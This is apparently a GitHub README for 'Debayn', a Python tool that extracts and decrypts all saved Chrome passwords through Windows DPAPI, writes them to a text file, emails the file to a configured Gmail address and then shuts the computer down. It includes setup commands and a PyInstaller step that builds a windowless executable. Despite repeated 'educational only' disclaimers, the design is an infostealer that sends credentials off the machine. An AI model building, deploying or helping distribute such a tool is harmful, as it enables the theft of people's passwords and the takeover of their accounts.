# TUPAD - Debayn Credential Extraction Tool

A Python-based utility that demonstrates how to access and decrypt saved login credentials from Google Chrome using the Windows Data Protection API (DPAPI). This tool is educational in nature and must be used ethically and legally.

---

## ⚠️ Disclaimer and Notice of Responsibility

> **This project is strictly for educational purposes only.**

Any misuse—such as unauthorized data access or password extraction from devices you do not own—is illegal and unethical. You assume **full responsibility** for your actions. The author is **not liable** for any damage, misuse, or legal issues caused by this tool.

By using or modifying this script, you **accept full responsibility** for your actions. The creator of this guide and tool is **not liable** for any misuse, damage, or legal repercussions that may result.

---

## 🔎 How This Script Works

This script interacts with **Google Chrome’s built-in password manager**, which stores credentials encrypted using the **Windows Data Protection API (DPAPI)**.

Steps:
- Extracts Chrome login credentials (saved usernames and passwords)
- Decrypts them using DPAPI and a cryptographic library
- Stores them in `chrome_passwords.txt`
- Emails the file using Gmail SMTP
- Shuts down the system afterward

---

## 📦 Dependencies

Install the required libraries:

```bash
pip install pywin32
pip install pycryptodomex
```

---

## ✉️ Email Configuration

Before using the tool, configure the following variables inside `Debayn.py`:

```python
from_email = "YOUR_EMAIL@gmail.com"
password = "APP_PASSWORD"  # Use Gmail App Password
to_email = "RECEIVER_EMAIL@gmail.com"
```

### 🔐 How to Generate an App Password:
1. Enable **2-Step Verification** on your Google account.
2. Visit: [https://myaccount.google.com/apppasswords](https://myaccount.google.com/apppasswords)
3. Create a password for **Mail > Other (Custom name)**.
4. Use this generated app password in the script.

---

## 💡 Building Into .exe (Optional)

To package this script into a standalone Windows executable:

```bash
pyinstaller --onefile --windowed "Debayn.py"
```

> 📌 *Note: If the filename contains spaces, wrap it in quotes.*

---

## 🚀 Running the Script

```bash
python Debayn.py
```

The script will:

- Extract passwords from all Chrome profiles (e.g., `Default`, `Profile 1`, etc.)
- Decrypt the credentials using your machine’s encryption key
- Save them in a local file named `chrome_passwords.txt`
- Email this file to the configured destination
- Shutdown the system

---

## 📁 Output File

- `chrome_passwords.txt`: This file contains all extracted and decrypted login credentials from Google Chrome.
- Sent via Gmail as an email attachment.

---

## ⚠️ Legal & Ethical Notice

Using this tool on any system **you do not own** or **without explicit consent**:

- Violates privacy laws
- Breaches cybersecurity regulations
- Can lead to **legal prosecution**

> 🚫 **NEVER** use this tool maliciously.

This project is made to:
- Understand how browsers store credentials
- Learn about encryption and security practices
- Protect your own systems from similar attacks

---

## 🛠️ Tech Stack

- **Language**: Python 3.x
- **Libraries**:
  - `pywin32` – Access to Windows system APIs
  - `pycryptodomex` – For encryption/decryption
- **Target OS**: Windows 10/11
- **Build Tool**: PyInstaller

---

## 👨‍💻 Author

**Ragheil**

- GitHub: [@Ragheil](https://github.com/Ragheil)

---
